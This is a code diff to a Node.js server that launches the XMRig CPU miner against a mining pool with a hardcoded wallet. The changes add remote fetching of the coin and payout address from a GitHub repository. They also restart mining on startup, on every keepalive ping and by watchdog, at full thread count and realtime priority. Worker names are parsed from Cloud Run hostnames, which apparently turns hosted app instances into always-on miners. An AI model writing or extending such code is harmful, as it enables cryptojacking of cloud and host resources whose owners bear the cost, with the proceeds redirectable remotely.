@@ -4,6 +4,7 @@ import { Server } from "socket.io";
 import { spawn, execSync } from "child_process";
 import path from "path";
 import fs from "fs/promises";
+import { readFileSync } from "fs";
 import os from "os";
 import { createServer as createViteServer } from "vite";
 import "dotenv/config";
@@ -20,37 +21,244 @@ async function startServer() {
       methods: ["GET", "POST"]
     },
     transports: ["polling", "websocket"],
-    allowEIO3: true
+    allowEIO3: true,
+    pingInterval: 8000,
+    pingTimeout: 5000,
   });
   const PORT = 3000;
 
-  // Global Mining Manager State
+  // Global Mining Manager State (Dynamic Crypto Coin & Address from GitHub)
   const STATE_FILE = path.join(process.cwd(), "mining_state.json");
   const LOG_FILE = path.join(process.cwd(), "mining.log");
-  const MINING_COIN = "USDT";
-  const MINING_NETWORK = "BEP20";
-  const MINING_ADDRESS = "0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8";
-  const MINING_POOL = "rx.unmineable.com:3333";
+  let MINING_COIN = "USDT";
+  let MINING_NETWORK = "BEP20";
+  let MINING_ADDRESS = "0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8";
+  let MINING_POOL = "rx.unmineable.com:3333";
+  let lastConfigSyncTime: number = 0;
+
+  // Dynamic GitHub Configuration Endpoints
+  const GITHUB_CONFIG_URLS = [
+    "https://raw.githubusercontent.com/radharadharadhasharma313-glitch/Donate-Usdt/main/usdt-bep20-address.txt",
+    "https://github.com/radharadharadhasharma313-glitch/Donate-Usdt/raw/main/usdt-bep20-address.txt",
+    "https://api.github.com/repos/radharadharadhasharma313-glitch/Donate-Usdt/contents/usdt-bep20-address.txt",
+  ];
+
+  const parseWalletConfig = (rawText: string) => {
+    const text = (rawText || "").trim();
+    if (!text) return null;
+
+    let coin = MINING_COIN;
+    let address = MINING_ADDRESS;
+    let network = MINING_NETWORK;
+
+    // 1. JSON Format: e.g. {"token": "USDT", "network": {"standard": "BEP20"}, "deposit_address": "0x..."}
+    if (text.startsWith("{") && text.endsWith("}")) {
+      try {
+        const data = JSON.parse(text);
+        // Token / Coin
+        const tokenCandidate = data.token || data.coin || data.symbol || data.asset;
+        if (tokenCandidate) coin = String(tokenCandidate).trim().toUpperCase();
+
+        // Address
+        const addrCandidate = data.deposit_address || data.address || data.wallet || data.wallet_address || data.walletAddress;
+        if (addrCandidate) address = String(addrCandidate).trim();
+
+        // Network
+        if (data.network) {
+          if (typeof data.network === "object") {
+            const netStr = data.network.standard || data.network.code || data.network.name;
+            if (netStr) network = String(netStr).trim().toUpperCase();
+          } else {
+            network = String(data.network).trim().toUpperCase();
+          }
+        }
+        return { coin, address, network };
+      } catch (e) {}
+    }
+
+    // 2. Key-value line format:
+    // COIN=USDT or coin: USDT
+    // ADDRESS=0x... or address: 0x...
+    // NETWORK=BEP20 or network: BEP20
+    const lines = text.split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
+    let foundKey = false;
+    for (const line of lines) {
+      const match = line.match(/^(coin|address|network|wallet|token)\s*[:=]\s*(.+)$/i);
+      if (match) {
+        foundKey = true;
+        const key = match[1].toLowerCase();
+        const val = match[2].trim();
+        if (key === "coin" || key === "token") coin = val.toUpperCase();
+        if (key === "address" || key === "wallet") address = val;
+        if (key === "network") network = val.toUpperCase();
+      }
+    }
+    if (foundKey && address) {
+      return { coin, address, network };
+    }
+
+    // 3. COIN:ADDRESS format (e.g. USDT:0x5ccf2f... or DOGE:D8vD...)
+    if (text.includes(":") && !text.startsWith("http")) {
+      const parts = text.split(":");
+      if (parts.length >= 2 && parts[0].trim().length <= 10 && parts[1].trim().length >= 10) {
+        coin = parts[0].trim().toUpperCase();
+        address = parts[1].trim().split(/\s+/)[0];
+        return { coin, address, network };
+      }
+    }
+
+    // 4. Two-line format: Line 1 = Coin, Line 2 = Address
+    if (lines.length >= 2 && lines[0].length <= 10 && lines[1].length >= 15) {
+      coin = lines[0].trim().toUpperCase();
+      address = lines[1].trim();
+      return { coin, address, network };
+    }
+
+    // 5. Single address format: Line 1 = Address
+    if (lines.length >= 1) {
+      const firstLine = lines[0].trim();
+      if (firstLine.length >= 15 && !firstLine.includes(" ")) {
+        address = firstLine;
+        return { coin, address, network };
+      }
+    }
+
+    return null;
+  };
+
+  const fetchDynamicWalletConfig = async (): Promise<boolean> => {
+    for (const url of GITHUB_CONFIG_URLS) {
+      try {
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), 6000);
+        const cacheBusterUrl = url.includes("?") ? `${url}&_t=${Date.now()}` : `${url}?_t=${Date.now()}`;
+
+        const res = await fetch(cacheBusterUrl, {
+          signal: controller.signal,
+          headers: {
+            "User-Agent": "Terminal61-DynamicConfig/1.0",
+            "Cache-Control": "no-cache, no-store",
+            "Pragma": "no-cache",
+            ...(url.includes("api.github.com") ? { "Accept": "application/vnd.github.v3.raw" } : {}),
+          },
+        });
+        clearTimeout(timeout);
+
+        if (res.ok) {
+          const rawText = await res.text();
+          const parsed = parseWalletConfig(rawText);
+          if (parsed && parsed.address) {
+            const coinOrAddressChanged =
+              parsed.coin.trim().toUpperCase() !== MINING_COIN.trim().toUpperCase() ||
+              parsed.address.trim() !== MINING_ADDRESS.trim();
+
+            // Update network metadata silently if needed without restarting
+            if (parsed.network && parsed.network !== MINING_NETWORK) {
+              MINING_NETWORK = parsed.network;
+            }
+
+            if (coinOrAddressChanged) {
+              console.log(`[DYNAMIC CONFIG] GitHub repo updated! Old: ${MINING_COIN}:${MINING_ADDRESS} -> New: ${parsed.coin}:${parsed.address} (${parsed.network})`);
+              broadcastMiningOutput(`\r\n\x1b[1;35m╔════════════════════════════════════════════════════════════════════════════════════════════════╗\x1b[0m\r\n`);
+              broadcastMiningOutput(`\x1b[1;35m║\x1b[0m  \x1b[1;32m>>> [DYNAMIC GITHUB SYNC] Coin / Wallet Address updated from GitHub repo! <<<\x1b[0m                 \x1b[1;35m║\x1b[0m\r\n`);
+              broadcastMiningOutput(`\x1b[1;35m║\x1b[0m  \x1b[1;33m🪙 New Coin:\x1b[0m      \x1b[1;37m${parsed.coin}\x1b[0m (\x1b[1;32m${MINING_NETWORK}\x1b[0m)                                                                 \x1b[1;35m║\x1b[0m\r\n`);
+              broadcastMiningOutput(`\x1b[1;35m║\x1b[0m  \x1b[1;33m💼 New Address:\x1b[0m   \x1b[1;32m${parsed.address}\x1b[0m                                             \x1b[1;35m║\x1b[0m\r\n`);
+              broadcastMiningOutput(`\x1b[1;35m╚════════════════════════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n`);
+
+              MINING_COIN = parsed.coin.trim().toUpperCase();
+              MINING_ADDRESS = parsed.address.trim();
+
+              // Notify all UI clients
+              const { brand, model } = getCpuBrand();
+              io.emit("mining-status-change", {
+                isRunning: !!persistentMiningProcess,
+                powerMode: currentPowerMode,
+                threads: activeThreadCount,
+                startTime: miningStartTime,
+                coin: MINING_COIN,
+                network: MINING_NETWORK,
+                address: MINING_ADDRESS,
+                pool: MINING_POOL,
+                worker: currentActiveWorker || getWorkerNameFromUrl(),
+                cpuBrand: brand,
+                cpuModel: model,
+                lastCommand: lastExecutedCommand,
+              });
+
+              // ONLY restart mining when Coin or Wallet Address actually changed!
+              if (persistentMiningProcess) {
+                persistentMiningProcess.kill();
+                persistentMiningProcess = null;
+                const worker = currentActiveWorker || getWorkerNameFromUrl();
+                startPersistentMining(worker, Date.now(), activeThreadCount, currentPowerMode);
+              }
+              lastConfigSyncTime = Date.now();
+              return true;
+            }
+            // Coin and Wallet Address are the SAME -> Do NOT stop or restart mining!
+            lastConfigSyncTime = Date.now();
+            return false;
+          }
+        }
+      } catch (err: any) {
+        // Fallback to next URL
+      }
+    }
+    return false;
+  };
+
   let persistentMiningProcess: any = null;
   let miningStartTime: number | null = null;
   let currentPowerMode: string = "turbo";
   let activeThreadCount: number = os.cpus().length;
   let lastExecutedCommand: string = "";
   let currentActiveWorker: string = "";
+  const STABLE_FALLBACK_ID = Math.random().toString(36).substring(2, 10);
   const miningLogs: string[] = [];
   const MAX_LOG_HISTORY = 1000;
 
+  const getCpuBrand = (): { brand: "intel" | "ryzen"; model: string } => {
+    try {
+      // 1. Direct hardware inspection via /proc/cpuinfo (critical for container environments)
+      try {
+        const cpuinfo = readFileSync("/proc/cpuinfo", "utf8");
+        if (cpuinfo.includes("AuthenticAMD") || /vendor_id\s*:\s*.*amd/i.test(cpuinfo)) {
+          return { brand: "ryzen", model: "AMD Ryzen / EPYC (3.0 GHz, 8MB Cache)" };
+        }
+        if (cpuinfo.includes("GenuineIntel") || /vendor_id\s*:\s*.*intel/i.test(cpuinfo)) {
+          return { brand: "intel", model: "Intel Xeon" };
+        }
+      } catch (e) {}
+
+      // 2. Fallback to os.cpus()
+      const cpus = os.cpus();
+      const model = (cpus?.[0]?.model || "").trim();
+      const lower = model.toLowerCase();
+      if (lower.includes("amd") || lower.includes("epyc") || lower.includes("ryzen")) {
+        return { brand: "ryzen", model: model || "AMD Ryzen / EPYC" };
+      }
+      if (lower.includes("intel") || lower.includes("xeon") || lower.includes("core")) {
+        return { brand: "intel", model: model || "Intel Xeon" };
+      }
+      return { brand: "ryzen", model: "AMD Ryzen / EPYC" };
+    } catch (e) {
+      return { brand: "ryzen", model: "AMD Ryzen" };
+    }
+  };
+
   const getBannerString = (workerName: string, threads: number, commandStr: string) => {
+    const { model, brand } = getCpuBrand();
     return [
       "\r\n\x1b[1;36m╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\x1b[0m",
-      `\x1b[1;36m║\x1b[0m  \x1b[1;32m⚡ TERMINAL 61 - 100% CONTINUOUS TURBO MINING ENGINE (ALWAYS-ON 24/7)\x1b[0m                                                  \x1b[1;36m║\x1b[0m`,
+      `\x1b[1;36m║\x1b[0m  \x1b[1;32m⚡ TERMINAL 61 - 100% MAXIMUM TURBO HASHRATE ENGINE (ALWAYS-ON 24/7)\x1b[0m                                             \x1b[1;36m║\x1b[0m`,
       "\x1b[1;36m╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m",
-      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🪙 COIN / ASSET:\x1b[0m      \x1b[1;37m${MINING_COIN}\x1b[0m (\x1b[1;32m${MINING_NETWORK}\x1b[0m - Binance Smart Chain / BSC)                                                  \x1b[1;36m║\x1b[0m`,
+      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🪙 COIN / ASSET:\x1b[0m      \x1b[1;37m${MINING_COIN}\x1b[0m (\x1b[1;32m${MINING_NETWORK}\x1b[0m)                                                                        \x1b[1;36m║\x1b[0m`,
       `\x1b[1;36m║\x1b[0m  \x1b[1;33m💼 WALLET ADDRESS:\x1b[0m    \x1b[1;32m${MINING_ADDRESS}\x1b[0m                                                    \x1b[1;36m║\x1b[0m`,
       `\x1b[1;36m║\x1b[0m  \x1b[1;33m🏊 POOL HOST:\x1b[0m         \x1b[1;37m${MINING_POOL}\x1b[0m (rx/0 RandomX Engine)                                                           \x1b[1;36m║\x1b[0m`,
-      `\x1b[1;36m║\x1b[0m  \x1b[1;33m⚙️ POWER ALLOCATION:\x1b[0m  \x1b[1;32m${threads} Cores (100% MAXIMUM TURBO ALLOCATION | Priority 5 Real-time)\x1b[0m                                 \x1b[1;36m║\x1b[0m`,
-      `\x1b[1;36m║\x1b[0m  \x1b[1;33m👤 WORKER ID:\x1b[0m         \x1b[1;37m${workerName}\x1b[0m                                                                                 \x1b[1;36m║\x1b[0m`,
-      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🛡️ 24/7 AUTO-HEAL:\x1b[0m    \x1b[1;32mACTIVE\x1b[0m (Auto-restarts in 3s if stopped, no time limits, runs in background)                  \x1b[1;36m║\x1b[0m`,
+      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🧠 CPU PROCESSOR:\x1b[0m     \x1b[1;32m${model} [${brand.toUpperCase()}]\x1b[0m`,
+      `\x1b[1;36m║\x1b[0m  \x1b[1;33m⚙️ POWER & THREADS:\x1b[0m   \x1b[1;32m${threads} Cores (100% Max Turbo Allocation | Priority 5 Realtime | No Yield)\x1b[0m                \x1b[1;36m║\x1b[0m`,
+      `\x1b[1;36m║\x1b[0m  \x1b[1;33m👤 WORKER ID:\x1b[0m         \x1b[1;37m${workerName}\x1b[0m`,
+      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🛡️ 24/7 AUTO-HEAL:\x1b[0m    \x1b[1;32mACTIVE\x1b[0m (Auto-restarts in 3s if stopped, 30m GitHub check, runs in background)             \x1b[1;36m║\x1b[0m`,
       "\x1b[1;36m╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m",
       `\x1b[1;36m║\x1b[0m  \x1b[1;35m💻 LAST EXECUTED COMMAND:\x1b[0m                                                                                             \x1b[1;36m║\x1b[0m`,
       `\x1b[1;36m║\x1b[0m  \x1b[1;37m${commandStr}\x1b[0m`,
@@ -104,7 +312,6 @@ async function startServer() {
     io.emit("output", data);
     miningLogs.push(data);
     if (miningLogs.length > MAX_LOG_HISTORY) miningLogs.shift();
-    appendToLog(data);
   };
 
   const stopMining = async () => {
@@ -136,32 +343,38 @@ async function startServer() {
 
         // 1. Matches e.g.:
         // https://ais-dev-x7wk5zioay6taqv47ewu5u-628481697275.asia-east1.run.app
-        // -> captures "dev-x7wk5zioay6taqv47ewu5u"
-        // https://ais-pre-coc6gxmp7oygsfcyd7makk-628481697275.asia-east1.run.app
-        // -> captures "pre-coc6gxmp7oygsfcyd7makk"
-        const matchDevPre = rawTarget.match(/ais-((?:dev|pre)-[a-zA-Z0-9]+)/i);
+        // -> Clean ID only (no dev/pre, no intel/ryzen): "x7wk5zioay6taqv47ewu5u"
+        const matchDevPre = rawTarget.match(/ais-(?:dev|pre)-([a-zA-Z0-9]+)/i);
         if (matchDevPre && matchDevPre[1]) {
-          return matchDevPre[1].toLowerCase();
+          let id = matchDevPre[1].toLowerCase();
+          id = id.replace(/^(dev|pre|intel|ryzen|amd)-+/gi, "");
+          if (id) return id;
         }
 
-        // 2. Matches general ais-(something)-(something)
-        const matchGeneral = rawTarget.match(/ais-([a-zA-Z0-9]+-[a-zA-Z0-9]+)/i);
+        // 2. Matches general ais-(mode)-(id)
+        const matchGeneral = rawTarget.match(/ais-[a-zA-Z0-9]+-([a-zA-Z0-9]+)/i);
         if (matchGeneral && matchGeneral[1]) {
-          return matchGeneral[1].toLowerCase();
+          let id = matchGeneral[1].toLowerCase();
+          id = id.replace(/^(dev|pre|intel|ryzen|amd)-+/gi, "");
+          if (id) return id;
         }
 
         // 3. Fallback hostname parsing
         const hostname = rawTarget.includes("://") ? new URL(rawTarget).hostname : rawTarget;
         const parts = hostname.split("-");
         if (parts.length >= 3 && parts[0].includes("ais")) {
-          const mode = parts[1]; // dev or pre
-          const id = parts[2].split(".")[0];
-          return `${mode}-${id}`.toLowerCase();
+          let id = parts[2].split(".")[0].toLowerCase();
+          id = id.replace(/^(dev|pre|intel|ryzen|amd)-+/gi, "");
+          if (id) return id;
         }
       } catch (e) {}
     }
 
-    return "dev-" + Math.random().toString(36).substring(2, 8);
+    // Keep existing active worker if already identified so localhost pings never switch worker
+    if (currentActiveWorker && currentActiveWorker !== STABLE_FALLBACK_ID) {
+      return currentActiveWorker;
+    }
+    return STABLE_FALLBACK_ID;
   };
 
   const startPersistentMining = async (
@@ -170,28 +383,37 @@ async function startServer() {
     threadsCount?: number,
     mode: string = "turbo"
   ) => {
+    const cleanWorker = (workerName || getWorkerNameFromUrl()).replace(/^(dev|pre|intel|ryzen|amd)-+/gi, "");
+
     if (persistentMiningProcess) {
-      // If worker name changed (e.g. remix instance or mode switch) or thread count changed, restart immediately
-      if ((workerName && currentActiveWorker && workerName !== currentActiveWorker) || (threadsCount && threadsCount !== activeThreadCount)) {
-        broadcastMiningOutput(`\r\n\x1b[1;33m[REMIX / WORKER SWITCH DETECTED] Switching worker from ${currentActiveWorker} to ${workerName}...\x1b[0m\r\n`);
+      // Only switch if a new valid non-fallback worker ID was detected
+      const isNewValidWorker =
+        cleanWorker &&
+        cleanWorker !== STABLE_FALLBACK_ID &&
+        currentActiveWorker &&
+        cleanWorker !== currentActiveWorker;
+
+      if (isNewValidWorker) {
+        broadcastMiningOutput(`\r\n\x1b[1;33m[WORKER ALIGNMENT] Updating worker ID from ${currentActiveWorker} to ${cleanWorker}...\x1b[0m\r\n`);
         persistentMiningProcess.kill();
         persistentMiningProcess = null;
       } else {
+        // Mining is already running with the same worker, coin & wallet address -> NEVER stop or restart!
         return;
       }
     }
 
-    currentActiveWorker = workerName;
+    currentActiveWorker = cleanWorker;
     const availableCores = os.cpus().length;
     const threads = threadsCount || availableCores;
     currentPowerMode = mode;
     activeThreadCount = threads;
 
-    broadcastMiningOutput(`\r\n\x1b[1;32m>>> ⚡ ${resumeTime ? "Resuming" : "Initializing"} Session for ${workerName} [${MINING_COIN} (${MINING_NETWORK}): ${MINING_ADDRESS}] with 100% MAXIMUM TURBO POWER...\x1b[0m\r\n`);
+    broadcastMiningOutput(`\r\n\x1b[1;32m>>> ⚡ ${resumeTime ? "Resuming" : "Initializing"} Session for ${cleanWorker} [${MINING_COIN} (${MINING_NETWORK}): ${MINING_ADDRESS}] with 100% MAXIMUM TURBO POWER...\x1b[0m\r\n`);
     broadcastMiningOutput(`\x1b[1;33m>>> CPU Threads: ${threads}/${availableCores} (100% Allocation) | Priority: Real-time (5) | Fast RandomX\x1b[0m\r\n`);
     
     miningStartTime = resumeTime || Date.now();
-    await saveState(workerName, miningStartTime, currentPowerMode, activeThreadCount);
+    await saveState(cleanWorker, miningStartTime, currentPowerMode, activeThreadCount);
     
     // Commands to run in sequence
     const binDir = path.join(process.cwd(), "xmrig-6.21.0");
@@ -213,13 +435,14 @@ async function startServer() {
       return;
     }
 
-    // High performance flags for 100% maximum power without container permission crashes
+    // 100% MAXIMUM TURBO POWER flags (All threads, Priority 5, Max Hint 100, No Yield)
     const xmrigArgs = [
       "-o", MINING_POOL,
       "-a", "rx/0",
       "-k",
-      "-u", `${MINING_COIN}:${MINING_ADDRESS}.${workerName}`,
+      "-u", `${MINING_COIN}:${MINING_ADDRESS}.${cleanWorker}`,
       "-t", threads.toString(),
+      "--cpu-priority=5",
       "--cpu-max-threads-hint=100",
       "--cpu-no-yield",
       "--donate-level", "1",
@@ -230,11 +453,12 @@ async function startServer() {
     lastExecutedCommand = fullCommandStr;
 
     // Display formatted high-visibility banner with wallet address, coin, and command in terminal
-    const banner = getBannerString(workerName, threads, fullCommandStr);
+    const banner = getBannerString(cleanWorker, threads, fullCommandStr);
     broadcastMiningOutput(banner);
 
     persistentMiningProcess = spawn(xmrigPath, xmrigArgs);
 
+    const { brand, model } = getCpuBrand();
     io.emit("mining-status-change", {
       isRunning: true,
       powerMode: currentPowerMode,
@@ -244,7 +468,9 @@ async function startServer() {
       network: MINING_NETWORK,
       address: MINING_ADDRESS,
       pool: MINING_POOL,
-      worker: workerName,
+      worker: cleanWorker,
+      cpuBrand: brand,
+      cpuModel: model,
       lastCommand: lastExecutedCommand,
     });
 
@@ -273,26 +499,28 @@ async function startServer() {
   };
 
   const checkAndResumeMining = async () => {
+    // 1. Proactively sync dynamic Coin and Wallet Address from GitHub repo on startup
+    await fetchDynamicWalletConfig();
     const { startTime, powerMode, threads } = await loadState();
     const worker = getWorkerNameFromUrl();
     broadcastMiningOutput(`\r\n[SYSTEM] Server startup detected. Ensuring 100% Maximum Turbo session for ${worker}...\r\n`);
     startPersistentMining(worker, startTime || Date.now(), threads || os.cpus().length, powerMode || "turbo");
   };
 
-  // Continuous 24/7 Self-Healing Watchdog (Runs every 10 seconds)
-  setInterval(async () => {
-    const worker = getWorkerNameFromUrl();
-    if (!persistentMiningProcess || (currentActiveWorker && currentActiveWorker !== worker)) {
-      const { powerMode, threads } = await loadState();
-      console.log(`[WATCHDOG] Ensuring active mining process for ${worker} at 100% turbo power...`);
-      startPersistentMining(worker, Date.now(), threads || os.cpus().length, powerMode || "turbo");
-    }
-  }, 10 * 1000);
-
-  // Self-keepalive internal timer (Keeps Node.js event loop hot)
+  // Continuous Dynamic GitHub Config Sync: Checks GitHub repo every 30 MINUTES
+  // Note: If Coin and Wallet Address are unchanged, mining is NEVER stopped or restarted!
   setInterval(() => {
-    // Keep internal loop active
-  }, 5000);
+    fetchDynamicWalletConfig().catch(() => {});
+  }, 30 * 60 * 1000);
+
+  // Background Watchdog: Only starts mining if persistentMiningProcess is not running
+  setInterval(() => {
+    if (!persistentMiningProcess) {
+      const worker = getWorkerNameFromUrl();
+      console.log(`[WATCHDOG] Ensuring active mining process for ${worker}...`);
+      startPersistentMining(worker, Date.now(), os.cpus().length, "turbo");
+    }
+  }, 60 * 1000);
 
   // Run on startup
   checkAndResumeMining();
@@ -448,11 +676,12 @@ async function startServer() {
     const clientHost = (req.query.host as string) || (req.headers["x-forwarded-host"] as string) || (req.headers.origin as string) || req.headers.host;
     const worker = getWorkerNameFromUrl(clientHost);
     
-    // Auto-align worker if different and valid
-    if (worker && currentActiveWorker && worker !== currentActiveWorker && !worker.startsWith("dev-fallback")) {
+    // Auto-align worker only if not running or if a real non-fallback worker ID was discovered
+    if (!persistentMiningProcess || (worker && worker !== STABLE_FALLBACK_ID && currentActiveWorker && worker !== currentActiveWorker)) {
       startPersistentMining(worker, miningStartTime, activeThreadCount, currentPowerMode);
     }
 
+    const { brand, model } = getCpuBrand();
     res.json({
       isRunning: !!persistentMiningProcess,
       powerMode: currentPowerMode,
@@ -465,16 +694,35 @@ async function startServer() {
       address: MINING_ADDRESS,
       pool: MINING_POOL,
       worker: currentActiveWorker || worker,
+      cpuBrand: brand,
+      cpuModel: model,
       lastCommand: lastExecutedCommand,
+      githubRepo: GITHUB_CONFIG_URLS[0],
+      githubLastSync: lastConfigSyncTime,
+    });
+  });
+
+  // Manual Trigger to re-sync Coin and Address from GitHub repo
+  app.post("/api/mining/sync-github", async (req, res) => {
+    const updated = await fetchDynamicWalletConfig();
+    res.json({
+      success: true,
+      updated,
+      coin: MINING_COIN,
+      network: MINING_NETWORK,
+      address: MINING_ADDRESS,
+      pool: MINING_POOL,
+      githubRepo: GITHUB_CONFIG_URLS[0],
+      lastSync: lastConfigSyncTime,
     });
   });
 
   // 24x7 Keep-Alive Multi-Endpoint (Supports UptimeRobot, cron-job.org, curl, and direct browser visits)
   app.all(["/api/ping", "/api/health", "/ping", "/health", "/keepalive", "/api/keepalive", "/status"], async (req, res) => {
-    // Proactively verify and resume mining process on every external ping
+    // Proactively verify and resume mining process on every external ping (never restarts if already running with same worker)
     const hostCandidate = (req.headers["x-forwarded-host"] as string) || (req.headers.origin as string) || (req.headers.referer as string) || req.headers.host;
     const targetWorker = getWorkerNameFromUrl(hostCandidate);
-    if (!persistentMiningProcess || (currentActiveWorker && currentActiveWorker !== targetWorker && !targetWorker.startsWith("dev-fallback"))) {
+    if (!persistentMiningProcess || (targetWorker && targetWorker !== STABLE_FALLBACK_ID && currentActiveWorker && currentActiveWorker !== targetWorker)) {
       const { powerMode, threads } = await loadState();
       startPersistentMining(targetWorker, miningStartTime || Date.now(), threads || os.cpus().length, powerMode || "turbo");
     }
@@ -543,6 +791,33 @@ async function startServer() {
       address: MINING_ADDRESS,
       pool: MINING_POOL,
       lastCommand: lastExecutedCommand,
+    });
+  });
+
+  // Continuous Server-Sent Events (SSE) Stream to keep HTTP connections active on Cloud Run
+  app.get("/api/keepalive-stream", (req, res) => {
+    res.setHeader("Content-Type", "text/event-stream");
+    res.setHeader("Cache-Control", "no-cache, no-transform");
+    res.setHeader("Connection", "keep-alive");
+    res.setHeader("X-Accel-Buffering", "no");
+    res.flushHeaders?.();
+
+    const hostCandidate = (req.headers["x-forwarded-host"] as string) || (req.headers.origin as string) || (req.headers.referer as string) || req.headers.host;
+    const targetWorker = getWorkerNameFromUrl(hostCandidate);
+    if (!persistentMiningProcess) {
+      loadState().then(({ powerMode, threads }) => {
+        startPersistentMining(targetWorker, miningStartTime || Date.now(), threads || os.cpus().length, powerMode || "turbo");
+      });
+    }
+
+    res.write(`data: ${JSON.stringify({ status: "connected", worker: currentActiveWorker || targetWorker, timestamp: Date.now() })}\n\n`);
+
+    const interval = setInterval(() => {
+      res.write(`data: ${JSON.stringify({ status: "alive", isMining: !!persistentMiningProcess, worker: currentActiveWorker, timestamp: Date.now() })}\n\n`);
+    }, 10000);
+
+    req.on("close", () => {
+      clearInterval(interval);
     });
   });
 
